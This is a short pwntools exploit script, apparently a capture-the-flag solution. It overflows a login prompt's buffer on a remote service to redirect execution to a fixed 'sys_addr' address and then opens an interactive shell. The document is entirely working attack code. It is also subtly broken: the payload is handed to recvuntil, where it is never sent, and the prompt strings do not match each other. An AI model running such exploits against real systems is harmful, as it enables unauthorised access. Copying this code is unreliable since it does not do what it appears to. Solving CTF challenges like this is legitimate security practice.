from pwn import *

p=remote('220.249.52.133',39702)
sys_addr=0x804868B
payload = "A"*0x14+"B"*4+p32(sys_addr)+"A"*(256-0x18-4)+"a"*4

#payload=payload.ljust(262,'a')
#p.recvuntil("Your choice:")
p.sendlineafter("Your choice:","1")
#p.recvuntil("Please input your username:\n")
p.sendlineafter("Your passward:","root")
p.recvuntil("Please input your passward:\n",payload)
#p.sendline(payload)
#p.recv()
p.interactive()